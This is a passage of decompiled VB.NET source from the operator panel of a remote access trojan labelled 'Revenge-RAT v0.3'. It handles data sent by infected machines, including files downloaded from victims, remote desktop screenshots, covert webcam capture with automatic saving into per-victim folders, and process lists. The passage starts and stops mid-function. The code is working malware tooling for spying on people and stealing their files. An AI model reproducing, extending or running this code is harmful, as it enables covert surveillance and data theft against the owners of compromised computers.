                            Dim icon9 As SingleIcon = DirectCast(NewLateBinding.LateGet(instance, Nothing, "Add", New Object() {RuntimeHelpers.GetObjectValue(SocketServer.Decode(strArray(4)))}, Nothing, Nothing, Nothing), SingleIcon)
                            icon9.CreateFrom(icon7.ToBitmap, IconOutputFormat.Vista)
                            NewLateBinding.LateCall(icon9, Nothing, "Save", New Object() {Operators.ConcatenateObject(Operators.ConcatenateObject((Interaction.Environ("Temp") & "\RevengeRATFM\"), SocketServer.Decode(strArray(4))), ".ico")}, Nothing, Nothing, Nothing, True)
                            manager18.ImageList1.Images.Add(Conversions.ToString(SocketServer.Decode(strArray(4))), New Bitmap((Interaction.Environ("Temp") & "\RevengeRATFM\" & SocketServer.Decode(strArray(4)).ToString & ".ico")))
                        Catch exception42 As Exception
                        End Try
                    End If
                    If flag Then
                        objectValue = manager18.Downloads.Items.Add(Conversions.ToString(SocketServer.Decode(strArray(2))), 1)
                    Else
                        objectValue = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(manager18.Downloads.Items, Nothing, "Add", New Object() {RuntimeHelpers.GetObjectValue(SocketServer.Decode(strArray(4))), RuntimeHelpers.GetObjectValue(SocketServer.Decode(strArray(2))), RuntimeHelpers.GetObjectValue(SocketServer.Decode(strArray(4)))}, Nothing, Nothing, Nothing))
                    End If
                    NewLateBinding.LateCall(NewLateBinding.LateGet(objectValue, Nothing, "SubItems", New Object(0 - 1) {}, Nothing, Nothing, Nothing), Nothing, "Add", New Object() {SocketServer.GetSize(Conversions.ToULong(SocketServer.Decode(strArray(3))))}, Nothing, Nothing, Nothing, True)
                    NewLateBinding.LateCall(NewLateBinding.LateGet(objectValue, Nothing, "SubItems", New Object(0 - 1) {}, Nothing, Nothing, Nothing), Nothing, "Add", New Object() {RuntimeHelpers.GetObjectValue(SocketServer.Decode(strArray(4)))}, Nothing, Nothing, Nothing, True)
                    NewLateBinding.LateCall(NewLateBinding.LateGet(objectValue, Nothing, "SubItems", New Object(0 - 1) {}, Nothing, Nothing, Nothing), Nothing, "Add", New Object() {"-"}, Nothing, Nothing, Nothing, True)
                    NewLateBinding.LateCall(NewLateBinding.LateGet(objectValue, Nothing, "SubItems", New Object(0 - 1) {}, Nothing, Nothing, Nothing), Nothing, "Add", New Object() {"Wating"}, Nothing, Nothing, Nothing, True)
                    NewLateBinding.LateSet(objectValue, Nothing, "ToolTipText", New Object() {sock}, Nothing, Nothing)
                    NewLateBinding.LateSet(objectValue, Nothing, "Tag", New Object() {"Down"}, Nothing, Nothing)
                    Me.s.Send(sock, ("Download" & Me.Key & Conversions.ToString(sock)))
                    Return
                Case "GetSelectedPath"
                    Dim manager9 As FileManager = DirectCast(My.Application.OpenForms.Item(("OpenFileManager" & strArray(2))), FileManager)
                    manager9.Pathloc.Text = Conversions.ToString(SocketServer.Decode(strArray(1)))
                    manager9.Files.Items.Clear()

                    If (manager9.Pathloc.Text.Length > 3) Then
                        manager9.Files.Items.Add("...", 0)
                        manager9.BackToolStripMenuItem.Enabled = True
                    Else
                        manager9.BackToolStripMenuItem.Enabled = False
                    End If
                    manager9.Fxtrv1.Enabled = False
                    objArray = New Object() {sock, Operators.ConcatenateObject(("GetFiles-Directorys" & Me.Key), SocketServer.Encode(manager9.Pathloc.Text))}
                    flagArray = New Boolean() {True, False}
                    NewLateBinding.LateCall(Me.s, Nothing, "Send", objArray, Nothing, Nothing, flagArray, True)
                    If flagArray(0) Then
                        sock = CInt(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(objArray(0)), GetType(Integer)))
                    End If
                    Return
                Case "DWBytes"
                    Dim enumerator9 As IEnumerator
                    Dim manager19 As FileManager = DirectCast(My.Application.OpenForms.Item(("OpenFileManager" & strArray(1))), FileManager)
                    Try
                        enumerator9 = manager19.Downloads.Items.GetEnumerator
                        Do While enumerator9.MoveNext
                            Dim item14 As ListViewItem = DirectCast(enumerator9.Current, ListViewItem)
                            If (My.Application.OpenForms.Item(("OpenFileManager" & strArray(1))) Is Nothing) Then
                                Me.s.Send(sock, "Abort")
                                Return
                            End If
                            If (item14.ToolTipText = strArray(5)) Then
                                Dim str5 As String
                                item14.SubItems.Item(3).Text = strArray(6)
                                If (Conversions.ToDouble(strArray(6)) = 10) Then
                                    str5 = Nothing
                                Else
                                    str5 = File.ReadAllText(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((Application.StartupPath & "\Users\"), SocketServer.Decode(strArray(2))), "\Downloads\"), SocketServer.Decode(strArray(3)))))
                                End If
                                File.WriteAllText(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((Application.StartupPath & "\Users\"), SocketServer.Decode(strArray(2))), "\Downloads\"), SocketServer.Decode(strArray(3)))), (str5 & strArray(4)))
                                If (Conversions.ToDouble(strArray(6)) = 110) Then
                                    item14.SubItems.Item(3).Text = "100%"
                                    item14.SubItems.Item(4).Text = "Finished"
                                    Me.s.Send(sock, "Abort")
                                    Try
                                        File.WriteAllBytes(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((Application.StartupPath & "\Users\"), SocketServer.Decode(strArray(2))), "\Downloads\"), SocketServer.Decode(strArray(7)))), Encoding.Default.GetBytes(File.ReadAllText(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((Application.StartupPath & "\Users\"), SocketServer.Decode(strArray(2))), "\Downloads\"), SocketServer.Decode(strArray(3)))))))
                                    Catch exception43 As Exception
                                        ProjectData.SetProjectError(exception43)
                                        Dim exception As Exception = exception43
                                        MessageBox.Show(exception.Message, "Revenge-RAT v0.3", MessageBoxButtons.OK, MessageBoxIcon.Hand)
                                        ProjectData.ClearProjectError()
                                    End Try
                                    File.Delete(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((Application.StartupPath & "\Users\"), SocketServer.Decode(strArray(2))), "\Downloads\"), SocketServer.Decode(strArray(3)))))
                                ElseIf ((Conversions.ToDouble(strArray(6)) <> 110) AndAlso ((item14.SubItems.Item(4).Text = "Wating") Or (item14.SubItems.Item(4).Text = "Downloading"))) Then
                                    item14.SubItems.Item(3).Text = (strArray(6) & "%")
                                    item14.SubItems.Item(4).Text = "Downloading"
                                End If
                            End If
                        Loop
                    Finally
                    End Try
                    Return
                Case "Up"
                    Dim enumerator10 As IEnumerator
                    Dim manager20 As FileManager = DirectCast(My.Application.OpenForms.Item(("OpenFileManager" & strArray(2))), FileManager)
                    Try
                        enumerator10 = manager20.Downloads.Items.GetEnumerator
                        Do While enumerator10.MoveNext
                            Dim item15 As ListViewItem = DirectCast(enumerator10.Current, ListViewItem)
                            If (My.Application.OpenForms.Item(("OpenFileManager" & strArray(2))) Is Nothing) Then
                                Me.s.Send(sock, "Abort")
                                Return
                            End If
                            If Operators.ConditionalCompareObjectEqual(item15.Tag, "Up", False) Then
                                If ((item15.SubItems.Item(4).Text = "Uploading") Or (item15.SubItems.Item(4).Text = "Wating")) Then
                                    item15.SubItems.Item(4).Text = "Uploading"
                                    item15.SubItems.Item(3).Text = strArray(1)
                                End If
                                If (strArray(1) = "110%") Then
                                    item15.SubItems.Item(3).Text = "100%"
                                    item15.SubItems.Item(4).Text = "Finished"
                                End If
                            End If
                        Loop
                    Finally
                    End Try
                    Return
                Case "ReadAllText"
                    Dim manager21 As FileManager = DirectCast(My.Application.OpenForms.Item(("OpenFileManager" & strArray(3))), FileManager)
                    manager21.TextPath.Text = Conversions.ToString(SocketServer.Decode(strArray(2)))
                    manager21.rat.Text = Conversions.ToString(SocketServer.Decode(strArray(1)))
                    manager21.ToolStripStatusLabel9.Text = Conversions.ToString(Operators.ConcatenateObject(SocketServer.Decode(strArray(2)), " - Loaded Successfully"))
                    manager21.TextPath.Enabled = True
                    manager21.Go.Enabled = True
                    manager21.rat.Enabled = True
                    manager21.Save.Enabled = True
                    Return
                Case "ResultText"
                    Dim manager22 As FileManager = DirectCast(My.Application.OpenForms.Item(("OpenFileManager" & strArray(3))), FileManager)
                    manager22.TextPath.Enabled = True
                    manager22.Go.Enabled = True
                    manager22.Save.Enabled = True
                    manager22.rat.Enabled = True
                    manager22.ToolStripStatusLabel9.Text = Conversions.ToString(Operators.ConcatenateObject(SocketServer.Decode(strArray(1)), strArray(2)))
                    Return
                Case "FPRO"
                    If Me.InvokeRequired Then
                        Dim _data7 As _data = New _data(AddressOf Me.data)
                        Me.Invoke(_data7, New Object() {sock, b})
                    Else
                        Dim properties As New File_Properties
                        properties.Name = (Conversions.ToString(sock) & "FINFO")
                        properties.Text = Conversions.ToString(Operators.ConcatenateObject(SocketServer.Decode(strArray(1)), " Properties"))
                        Dim strArray7 As String() = Strings.Split(Conversions.ToString(SocketServer.Decode(strArray(2))), "|FMSPLITER|", -1, CompareMethod.Binary)
                        properties.FP = strArray(4)
                        properties.Sock = sock
                        properties.IT = Conversions.ToBoolean(strArray(3))
                        If Conversions.ToBoolean(strArray(3)) Then
                            If (strArray7(0) <> "N/A") Then
                                properties.PictureBox1.Image = Image.FromStream(New MemoryStream(Convert.FromBase64String(strArray7(0))))
                            End If
                        Else
                            properties.PictureBox1.Image = My.Forms.FileManager.ImageList1.Images.Item(0)
                        End If
                        properties.Icon = Icon.FromHandle(New Bitmap(properties.PictureBox1.Image).GetHicon)
                        properties.FN.Text = Conversions.ToString(SocketServer.Decode(strArray(1)))
                        properties.Label3.Text = strArray7(1)
                        properties.Label4.Text = strArray7(2)
                        properties.Label8.Text = Conversions.ToString(SocketServer.Decode(strArray7(3)))
                        Try
                            properties.Label6.Text = (SocketServer.GetSize(Conversions.ToULong(strArray7(4))) & " (" & Conversions.ToInteger(strArray7(4)).ToString("N") & " bytes)")
                        Catch exception44 As Exception
                            ProjectData.SetProjectError(exception44)
                            properties.Label6.Text = "0.00 bytes (0.00 bytes)"
                            ProjectData.ClearProjectError()
                        End Try
                        properties.Label13.Text = strArray7(5)
                        properties.Label11.Text = strArray7(6)
                        properties.Label16.Text = strArray7(7)
                        If Not Conversions.ToBoolean(strArray(3)) Then
                            properties.RN.Enabled = False
                            properties.REN = False
                        Else
                            properties.RN.Checked = Convert.ToBoolean(strArray7(8))
                            properties.REN = Convert.ToBoolean(strArray7(8))
                        End If
                        properties.HI.Checked = Convert.ToBoolean(strArray7(9))
                        properties.FNS = Conversions.ToString(SocketServer.Decode(strArray(1)))
                        properties.HIF = Convert.ToBoolean(strArray7(9))
                        If Conversions.ToBoolean(strArray(3)) Then
                            properties.FINFO.Items.Add("File description :").SubItems.Add(strArray7(2))
                            properties.FINFO.Items.Add("Type :").SubItems.Add(strArray7(1))
                            properties.FINFO.Items.Add("File version :").SubItems.Add(strArray7(10))
                            properties.FINFO.Items.Add("Product name :").SubItems.Add(strArray7(11))
                            properties.FINFO.Items.Add("Product version :").SubItems.Add(strArray7(12))
                            properties.FINFO.Items.Add("Copyright :").SubItems.Add(strArray7(13))
                            properties.FINFO.Items.Add("Size :").SubItems.Add(SocketServer.GetSize(Conversions.ToULong(strArray7(4))))
                            properties.FINFO.Items.Add("Data modified :").SubItems.Add(strArray7(6))
                        Else
                            properties.TabControl1.TabPages.Remove(properties.TabPage2)
                        End If
                        properties.Show()
                        properties.ApplySettings.Enabled = False
                    End If
                    Return
                Case "Counters"
                    Dim manager8 As FileManager = DirectCast(My.Application.OpenForms.Item(("OpenFileManager" & strArray(3))), FileManager)
                    If Operators.ConditionalCompareObjectEqual(SocketServer.Decode(strArray(4)), manager8.Pathloc.Text, False) Then
                        Try
                            manager8.ToolStripStatusLabel3.Text = ("Files : " & strArray(1))
                            manager8.ToolStripStatusLabel2.Text = ("- Directories : " & strArray(2) & " -")
                        Catch exception36 As Exception
                            ProjectData.SetProjectError(exception36)
                            manager8.ToolStripStatusLabel3.Text = "Files : ????"
                            manager8.ToolStripStatusLabel2.Text = "- Directories : ???? -"
                            ProjectData.ClearProjectError()
                        End Try
                    End If
                    Return
                Case Else
                    Select Case str13
                        Case "PRS"
                            Dim manager23 As FileManager = DirectCast(My.Application.OpenForms.Item(("OpenFileManager" & strArray(3))), FileManager)
                            manager23.ToolStripStatusLabel1.Text = Conversions.ToString(Operators.ConcatenateObject(strArray(1), SocketServer.Decode(strArray(2))))
                            Return
                        Case "FP"
                            Dim manager24 As FileManager = DirectCast(My.Application.OpenForms.Item(("OpenFileManager" & strArray(2))), FileManager)
                            If (My.Application.OpenForms.Item("FDUR") Is Nothing) Then
                                If Me.InvokeRequired Then
                                    Dim _data8 As _data = New _data(AddressOf Me.data)
                                    Me.Invoke(_data8, New Object() {sock, b})
                                Else
                                    Dim dfurl As New DFURL
                                    dfurl.Name = ("FDUR" & strArray(2))
                                    dfurl.Text = Conversions.ToString(SocketServer.Decode(strArray(1)))
                                    dfurl.Show()
                                End If
                            End If
                            Return
                        Case "DERR"
                            Dim dfurl2 As DFURL = DirectCast(My.Application.OpenForms.Item(("FDUR" & strArray(2))), DFURL)
                            dfurl2.Text = Conversions.ToString(SocketServer.Decode(strArray(1)))
                            Return
                        Case "DPG"
                            Dim dfurl3 As DFURL = DirectCast(My.Application.OpenForms.Item("FDUR"), DFURL)
                            dfurl3.Label1.Text = ("Progress : " & strArray(1) & "%")
                            dfurl3.ProgressBar1.Value = Conversions.ToInteger(strArray(1))
                            dfurl3.Label4.Text = (strArray(3) & " KB/s")
                            dfurl3.Label5.Text = strArray(2)
                            Return
                        Case "DR"
                            DirectCast(My.Application.OpenForms.Item("FDUR"), DFURL).Close()
                            Return
                        Case "CaptureScreen"
                            If (My.Application.OpenForms.Item(("CaptureScreen" & strArray(4))) Is Nothing) Then
                                If Me.InvokeRequired Then
                                    Dim _data9 As _data = New _data(AddressOf Me.data)
                                    Me.Invoke(_data9, New Object() {sock, b})
                                Else
                                    Dim screen As New RemoteScreen
                                    screen.F = Me
                                    screen.sock = sock
                                    screen.Name = ("CaptureScreen" & strArray(4))
                                    screen.Sz = New Size(Conversions.ToInteger(strArray(1)), Conversions.ToInteger(strArray(2)))
                                    screen.Text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject("Remote Desktop : ", SocketServer.Decode(strArray(3))), " - "), Me.s.IP(sock)), " - "), strArray(1)), " X "), strArray(2)))
                                    screen.T = screen.Text
                                    screen.FolderSavePic = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((Application.StartupPath & "\Users\"), SocketServer.Decode(strArray(3))), "\Desktop\"))
                                    Dim num56 As Double = (Conversions.ToDouble(strArray(5)) - 1)
                                    Dim num9 As Double = 0
                                    Do While (num9 <= num56)
                                        screen.D.Items.Add(("Device : " & Conversions.ToString(num9)))
                                        num9 += 1
                                    Loop
                                    screen.Show()
                                End If
                            End If
                            Return
                        Case "Start Capture"
                            Try
                                If (Not My.Application.OpenForms.Item(("CaptureScreen" & strArray(2))) Is Nothing) Then
                                    Dim screen2 As RemoteScreen = DirectCast(My.Application.OpenForms.Item(("CaptureScreen" & strArray(2))), RemoteScreen)
                                    screen2.ProgressBar1.Value = 0
                                    If (((Not screen2 Is Nothing) AndAlso (strArray(1).Length <> 1)) AndAlso Operators.ConditionalCompareObjectEqual(screen2.ST.Tag, "1", False)) Then
                                        Try
                                            screen2.SH.Focus()
                                            Dim buffer As Byte() = Encoding.Default.GetBytes(strArray(1))
                                            screen2.P1.Image = Image.FromStream(New MemoryStream(buffer))
                                            screen2.Text = (screen2.T & " - Packet : [ " & SocketServer.GetSize(CULng(Encoding.Default.GetBytes(strArray(1)).Length)) & " ]")
                                            screen2.ProgressBar1.MarqueeAnimationSpeed = buffer.Length
                                            screen2.ProgressBar1.Maximum = buffer.Length
                                            screen2.ProgressBar1.Increment(buffer.Length)
                                        Catch exception45 As Exception
                                            ProjectData.SetProjectError(exception45)
                                            ProjectData.ClearProjectError()
                                        End Try
                                        If Operators.ConditionalCompareObjectEqual(screen2.SA.Tag, "1", False) Then
                                            Try
                                                Dim buffer3 As Byte() = DirectCast(NewLateBinding.LateIndexGet(Functions.fx(b, ("Start Capture" & Me.Key)), New Object() {1}, Nothing), Byte())
                                                File.WriteAllBytes(String.Concat(New String() {screen2.FolderSavePic, "\", DateTime.Now.ToString("yyyy-MM-dd"), "_", DateAndTime.TimeOfDay.ToString("h-mm-ss tt"), ".png"}), buffer3)
                                            Catch exception46 As Exception
                                                ProjectData.SetProjectError(exception46)
                                                ProjectData.ClearProjectError()
                                            End Try
                                        End If
                                    End If
                                End If
                            Catch exception47 As Exception
                            End Try
                            Return
                        Case "Open Remote WebCam"
                            If (Not My.Application.OpenForms.Item(("Open Remote WebCam" & strArray(2))) Is Nothing) Then
                                Me.s.Send(Conversions.ToInteger(strArray(2)), "Abort")
                            ElseIf Me.InvokeRequired Then
                                Dim _data10 As _data = New _data(AddressOf Me.data)
                                Me.Invoke(_data10, New Object() {sock, b})
                            Else
                                Dim cam As New Remote_WebCam
                                cam.Sock = sock
                                cam.Name = ("Open Remote WebCam" & strArray(2))
                                cam.Text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject("Remote WebCam : ", SocketServer.Decode(strArray(1))), " - "), Me.s.IP(sock)))
                                cam.RWT = cam.Text
                                cam.FolderSavePic = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((Application.StartupPath & "\Users\"), SocketServer.Decode(strArray(1))), "\Camera\"))
                                cam.Show()
                            End If
                            Return
                    End Select
                    If (str13 <> "Devices") Then
                        GoTo Label_519A
                    End If
                    cam2 = DirectCast(My.Application.OpenForms.Item(("Open Remote WebCam" & strArray(2))), Remote_WebCam)
                    Dim strArray8 As String() = Strings.Split(Conversions.ToString(SocketServer.Decode(strArray(1))), "REVRATPL", -1, CompareMethod.Binary)
                    Dim num57 As Integer = (strArray8.Length - 1)
                    Dim num10 As Integer = 0
                    Do While (num10 <= num57)
                        If (strArray8(num10) <> "") Then
                            If (My.Application.OpenForms.Item(("Open Remote WebCam" & strArray(2))) Is Nothing) Then
                                Exit Do
                            End If
                            cam2.Devices.Items.Add(strArray8(num10), 0)
                        End If
                        num10 += 1
                    Loop
                    Exit Select
            End Select
            cam2.Devices.Enabled = True
            cam2.Start.Enabled = True
            cam2.Refresh.Enabled = True
            Return
Label_519A:
            If (str13 = "Camera Picture") Then
                If (My.Application.OpenForms.Item(("Open Remote WebCam" & strArray(2))) Is Nothing) Then
                    Me.s.Send(sock, "Stop")
                Else
                    Dim cam3 As Remote_WebCam = DirectCast(My.Application.OpenForms.Item(("Open Remote WebCam" & strArray(2))), Remote_WebCam)
                    cam3.SocketServer1.Value = 0
                    If (cam3.Start.Text = "Stop Capture") Then
                        Dim buffer4 As Byte() = Encoding.Default.GetBytes(strArray(1))
                        Dim stream As New MemoryStream(buffer4)
                        cam3.PictureBox1.Image = Image.FromStream(stream)
                        cam3.Label5.Text = Functions.siz(Conversions.ToString(CLng(buffer4.Length)))
                        stream.Dispose()
                        cam3.SocketServer1.MarqueeAnimationSpeed = buffer4.Length
                        cam3.SocketServer1.Maximum = buffer4.Length
                        cam3.SocketServer1.Increment(buffer4.Length)
                        cam3.Text = (cam3.RWT & " - Packet : [ " & SocketServer.GetSize(CULng(buffer4.Length)) & " ]")
                        If cam3.AutoSave.Checked Then
                            Try
                                File.WriteAllBytes(String.Concat(New String() {cam3.FolderSavePic, "\", DateTime.Now.ToString("yyyy-MM-dd"), "_", DateAndTime.TimeOfDay.ToString("h-mm-ss tt"), ".png"}), buffer4)
                            Catch exception48 As Exception
                            End Try
                        End If
                    Else
                        Me.s.Send(sock, "Stop")
                    End If
                End If
                Return
            End If
            If (str13 = "System Manager") Then
                If (My.Application.OpenForms.Item(("System Manager" & strArray(2))) Is Nothing) Then
                    If Me.InvokeRequired Then
                        Dim _data11 As _data = New _data(AddressOf Me.data)
                        Me.Invoke(_data11, New Object() {sock, b})
                    Else
                        Dim manager25 As New System_Manager
                        manager25.sock = sock
                        manager25.Name = ("System Manager" & strArray(2))
                        manager25.Text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject("System Manager : ", SocketServer.Decode(strArray(1))), " - "), Me.s.IP(sock)))
                        manager25.Show()
                    End If
                End If
                Return
            End If
            If (str13 <> "Process") Then
                GoTo Label_6289
            End If
            If Me.InvokeRequired Then
                Dim _data12 As _data = New _data(AddressOf Me.data)
                Me.Invoke(_data12, New Object() {sock, b})
                Return
            End If
            If Not Directory.Exists((Interaction.Environ("Temp") & "\RevengeRATPM\")) Then
                Directory.CreateDirectory((Interaction.Environ("Temp") & "\RevengeRATPM\"))
            End If
            Dim manager26 As System_Manager = DirectCast(My.Application.OpenForms.Item(("System Manager" & strArray(2))), System_Manager)
            Dim strArray9 As String() = Strings.Split(Conversions.ToString(clsCompressedString.Decode(strArray(1))), "ProcessesPluging", -1, CompareMethod.Binary)
            Dim expression As String = Nothing
            manager26.Processlists.Groups.Add("", "Applications ( 0 )")
            Try
                Dim num58 As Integer = (strArray9.Length - 1)
                Dim num12 As Integer = 0
                Do While (num12 <= num58)
                    If Not File.Exists((Interaction.Environ("Temp") & "\RevengeRATPM\" & strArray9(num12) & ".ico")) Then
                        If (strArray9((num12 + 3)) <> "-") Then
                            Try
                                If Not manager26.ImageList2.Images.ContainsKey(strArray9(num12)) Then
                                    Dim icon10 As Icon = Icon.ExtractAssociatedIcon(strArray9((num12 + 3)))
                                    Dim icon12 As SingleIcon = New MultiIcon().Add(strArray9(num12))
                                    icon12.CreateFrom(icon10.ToBitmap, IconOutputFormat.Vista)
                                    icon12.Save((Interaction.Environ("Temp") & "\RevengeRATPM\" & strArray9(num12) & ".ico"))
                                    manager26.ImageList2.Images.Add(strArray9(num12), New Bitmap((Interaction.Environ("Temp") & "\RevengeRATPM\" & strArray9(num12) & ".ico")))
                                Else
                                    manager26.ImageList2.Images.Add(strArray9(num12), New Bitmap((Interaction.Environ("Temp") & "\RevengeRATPM\" & strArray9(num12) & ".ico")))
                                End If
                            Catch exception49 As Exception
                                ProjectData.SetProjectError(exception49)
                                Dim exception2 As Exception = exception49
                                File.Create((Interaction.Environ("Temp") & "\RevengeRATPM\" & strArray9(num12) & ".exe")).Close()
                                Dim icon13 As Icon = Icon.ExtractAssociatedIcon((Interaction.Environ("Temp") & "\RevengeRATPM\" & strArray9(num12) & ".exe"))
                                Dim icon15 As SingleIcon = New MultiIcon().Add(strArray9(num12))
                                icon15.CreateFrom(icon13.ToBitmap, IconOutputFormat.Vista)
                                icon15.Save((Interaction.Environ("Temp") & "\RevengeRATPM\" & strArray9(num12) & ".ico"))
                                File.Delete((Interaction.Environ("Temp") & "\RevengeRATPM\" & strArray9(num12) & ".exe"))
                                manager26.ImageList2.Images.Add(strArray9(num12), New Bitmap((Interaction.Environ("Temp") & "\RevengeRATPM\" & strArray9(num12) & ".ico")))
                                ProjectData.ClearProjectError()
                            End Try
                        End If
                    Else
                        manager26.ImageList2.Images.Add(strArray9(num12), New Bitmap((Interaction.Environ("Temp") & "\RevengeRATPM\" & strArray9(num12) & ".ico")))
                    End If
                    If (My.Application.OpenForms.Item(("System Manager" & strArray(2))) Is Nothing) Then
                        Me.s.Send(sock, "Abort")
                        GoTo Label_5C67
                    End If
                    Try
                        If (strArray9((num12 + 3)).Length > 3) Then
                            Dim item16 As ListViewItem = manager26.Processlists.Items.Add(New ListViewItem(New String() {strArray9(num12)}, strArray9(num12), manager26.Processlists.Groups.Item((manager26.Processlists.Groups.Count - 1))))
                            item16.SubItems.Add(strArray9((num12 + 1)))
                            item16.SubItems.Add(strArray9((num12 + 2)))
                            item16.SubItems.Add(strArray9((num12 + 3)))
                            item16.SubItems.Add(strArray9((num12 + 4)))
                            item16.SubItems.Add(strArray9((num12 + 5)))
                            item16.SubItems.Add(strArray9((num12 + 6)))
                            item16.SubItems.Add(strArray9((num12 + 7)))
                            item16.SubItems.Add(strArray9((num12 + 8)))
                        Else
                            expression = String.Concat(New String() {expression, strArray9(num12), "|", strArray9((num12 + 1)), "|", strArray9((num12 + 2)), "|", strArray9((num12 + 3)), "|", strArray9((num12 + 4)), "|", strArray9((num12 + 5)), "|", strArray9((num12 + 6)), "|", strArray9((num12 + 7)), "|", strArray9((num12 + 8)), "|"})
                        End If
                    Catch exception50 As Exception
                        expression = String.Concat(New String() {expression, strArray9(num12), "|", strArray9((num12 + 1)), "|", strArray9((num12 + 2)), "|", strArray9((num12 + 3)), "|", strArray9((num12 + 4)), "|", strArray9((num12 + 5)), "|", strArray9((num12 + 6)), "|", strArray9((num12 + 7)), "|", strArray9((num12 + 8)), "|"})
                    End Try
                    num12 = (num12 + 8)
                    num12 += 1
                Loop
            Catch exception51 As Exception
            End Try
Label_5C67:
            Try
                enumerator11 = manager26.Processlists.Groups.GetEnumerator
                Do While enumerator11.MoveNext
                    Dim group As ListViewGroup = DirectCast(enumerator11.Current, ListViewGroup)
                    If (group.Header = "Applications ( 0 )") Then
                        group.Header = "Applications ( 0 )".Replace("0", Conversions.ToString(manager26.Processlists.Items.Count))
                    End If
                Loop
            Finally
            End Try
            Dim num11 As Integer = 0
            Try
                If Not Directory.Exists((Interaction.Environ("Temp") & "\RevengeRATPM\")) Then
                    Directory.CreateDirectory((Interaction.Environ("Temp") & "\RevengeRATPM\"))
                End If
                Dim strArray10 As String() = Strings.Split(expression, "|", -1, CompareMethod.Binary)
                manager26.Processlists.Groups.Add("", "System Idle Process ( 0 )")
                Try
                    Dim length As Integer = strArray10.Length
                    Dim num13 As Integer = 0
                    Do While (num13 <= length)
                        num11 += 1
                        If Not File.Exists((Interaction.Environ("Temp") & "\RevengeRATPM\" & strArray10(num13) & ".ico")) Then
                            If (strArray10((num13 + 3)) <> "-") Then
                                Try
                                    If Not manager26.ImageList2.Images.ContainsKey(strArray10(num13)) Then
                                        Dim icon16 As Icon = Icon.ExtractAssociatedIcon(strArray10((num13 + 3)))
                                        Dim icon18 As SingleIcon = New MultiIcon().Add(strArray10(num13))
                                        icon18.CreateFrom(icon16.ToBitmap, IconOutputFormat.Vista)
                                        icon18.Save((Interaction.Environ("Temp") & "\RevengeRATPM\" & strArray10(num13) & ".ico"))
                                        manager26.ImageList2.Images.Add(strArray10(num13), New Bitmap((Interaction.Environ("Temp") & "\RevengeRATPM\" & strArray10(num13) & ".ico")))
                                    Else
                                        manager26.ImageList2.Images.Add(strArray10(num13), New Bitmap((Interaction.Environ("Temp") & "\RevengeRATPM\" & strArray10(num13) & ".ico")))
                                    End If
                                Catch exception52 As Exception
                                    ProjectData.SetProjectError(exception52)
                                    File.Create((Interaction.Environ("Temp") & "\RevengeRATPM\" & strArray10(num13) & ".exe")).Close()
                                    Dim icon19 As Icon = Icon.ExtractAssociatedIcon((Interaction.Environ("Temp") & "\RevengeRATPM\" & strArray10(num13) & ".exe"))
                                    Dim icon21 As SingleIcon = New MultiIcon().Add(strArray10(num13))
                                    icon21.CreateFrom(icon19.ToBitmap, IconOutputFormat.Vista)
                                    icon21.Save((Interaction.Environ("Temp") & "\RevengeRATPM\" & strArray10(num13) & ".ico"))
                                    File.Delete((Interaction.Environ("Temp") & "\RevengeRATPM\" & strArray10(num13) & ".exe"))
                                    manager26.ImageList2.Images.Add(strArray10(num13), New Bitmap((Interaction.Environ("Temp") & "\RevengeRATPM\" & strArray10(num13) & ".ico")))
                                    ProjectData.ClearProjectError()
                                End Try
                            End If
                        Else
                            manager26.ImageList2.Images.Add(strArray10(num13), New Bitmap((Interaction.Environ("Temp") & "\RevengeRATPM\" & strArray10(num13) & ".ico")))
                        End If
                        If (My.Application.OpenForms.Item(("System Manager" & strArray(2))) Is Nothing) Then
                            Me.s.Send(sock, "Abort")
                            GoTo Label_61BB
                        End If
                        Dim item17 As ListViewItem = manager26.Processlists.Items.Add(New ListViewItem(New String() {strArray10(num13)}, strArray10(num13), manager26.Processlists.Groups.Item((manager26.Processlists.Groups.Count - 1))))
                        item17.SubItems.Add(strArray10((num13 + 1)))
                        item17.SubItems.Add(strArray10((num13 + 2)))
                        item17.SubItems.Add(strArray10((num13 + 3)))
                        item17.SubItems.Add(strArray10((num13 + 4)))
                        item17.SubItems.Add(strArray10((num13 + 5)))
                        item17.SubItems.Add(strArray10((num13 + 6)))
                        item17.SubItems.Add(strArray10((num13 + 7)))
                        item17.SubItems.Add(strArray10((num13 + 8)))
                        num13 = (num13 + 8)
                        num13 += 1
                    Loop
                Catch exception53 As Exception
                End Try
            Catch exception54 As Exception
            End Try
Label_61BB:
            Try
                enumerator12 = manager26.Processlists.Groups.GetEnumerator
                Do While enumerator12.MoveNext
                    Dim group2 As ListViewGroup = DirectCast(enumerator12.Current, ListViewGroup)
                    If (group2.Header = "System Idle Process ( 0 )") Then
                        group2.Header = "System Idle Process ( 0 )".Replace("0", Conversions.ToString(CInt((num11 - 1))))
                    End If
                Loop
            Finally
            End Try
            Try
                manager26.Processlists.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize)
            Catch exception55 As Exception
            End Try
            Return
Label_6289:
            If (str13 = "Process Result") Then
                Dim manager27 As System_Manager = DirectCast(My.Application.OpenForms.Item(("System Manager" & strArray(2))), System_Manager)
                If (strArray(1) = "List of processes successfully created") Then
                    manager27.Processlists.Enabled = True
                    manager27.ToolStripStatusLabel4.Text = "- List of processes successfully created"
                    manager27.ToolStripStatusLabel1.Text = ("Processs : ( " & Conversions.ToString(manager27.Processlists.Items.Count) & " )")
                    manager27.Processlists.FindItemWithText(Conversions.ToString(SocketServer.Decode(strArray(3)))).ForeColor = Color.Red
